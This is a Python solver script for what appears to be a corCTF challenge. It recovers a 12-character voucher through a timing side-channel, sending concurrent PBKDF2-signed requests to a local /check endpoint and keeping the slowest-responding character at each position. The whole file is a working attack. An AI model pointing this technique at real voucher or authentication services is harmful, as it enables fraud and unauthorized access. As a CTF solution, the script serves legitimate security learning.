#!/usr/bin/env python3
import binascii
import hashlib
import json
import requests
import sys
import time

from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import Tuple


URL = "http://localhost:8000/check"
VOUCHER_LENGTH = 12
USER_AGENT = "jazzzzzzzzzzzzzzzzzz"
PBKDF2_ITERATIONS = 1750000
PBKDF2_DKLEN = 32
CHARSET = "ABCDEF01234567890"
DASH_POSITIONS = [1, 4, 8]
TIMEOUT = 10.0
FILLER = "#"
# Must not be more than the amount of gunicorn workers, or everything goes to shit, on remote > 2 also seems to go to shit.
THREADS = 4
SUCCESS_MARKER = "See you at corCTF 2026"


def pbkdf2_hex(password: str, salt: str, iterations: int, dklen: int) -> str:
    return binascii.hexlify(
        hashlib.pbkdf2_hmac("sha256", password.encode(), salt.encode(), iterations, dklen=dklen)
    ).decode()


def measure(voucher: str) -> Tuple[float, str, int]:
    signature = pbkdf2_hex(voucher, USER_AGENT, PBKDF2_ITERATIONS, PBKDF2_DKLEN)
    headers = {"User-Agent": USER_AGENT, "Content-Type": "application/json"}
    body = {"voucher": voucher, "signature": signature}
    t0 = time.perf_counter()
    try:
        r = requests.post(URL, headers=headers, data=json.dumps(body), timeout=TIMEOUT)
        elapsed = time.perf_counter() - t0
        return elapsed, r.text, r.status_code
    except requests.RequestException as e:
        return float("inf"), f"REQUEST_ERROR: {e}", -1


def pick_next_char(known_prefix: str) -> Tuple[str, float]:
    remain = VOUCHER_LENGTH - len(known_prefix) - 1
    if remain < 0:
        raise ValueError("known_prefix is longer than VOUCHER_LENGTH")

    timings = []

    for i in range(0, len(CHARSET), THREADS):
        batch = CHARSET[i:i+THREADS]
        with ThreadPoolExecutor(max_workers=THREADS) as executor:
            futures = {}
            for c in batch:
                voucher = known_prefix + c + (FILLER * remain)
                futures[executor.submit(measure, voucher)] = (c, voucher)

            for future in as_completed(futures):
                c, voucher = futures[future]
                elapsed, text, status = future.result()
                if status == 200 and SUCCESS_MARKER in text:
                    print(f"[+] Success! Voucher: {voucher}")
                    print(text.strip())
                    sys.exit(0)
                timings.append((c, elapsed))

    best_char, best_time = max(timings, key=lambda x: x[1])
    return best_char, best_time


def main():
    print(f"[i] Target: {URL}")

    known = ""
    for idx in range(len(known), VOUCHER_LENGTH):
        if idx in DASH_POSITIONS:
            known += "-"
            print(f"[+] position {idx:02d}: '-' \t\t\t  => prefix={known}")
            continue
        best_char, best_time = pick_next_char(known)
        known += best_char
        print(f"[+] position {idx:02d}: chose '{best_char}' (time {best_time:.4f}s) => prefix={known}")


if __name__ == "__main__":
    main()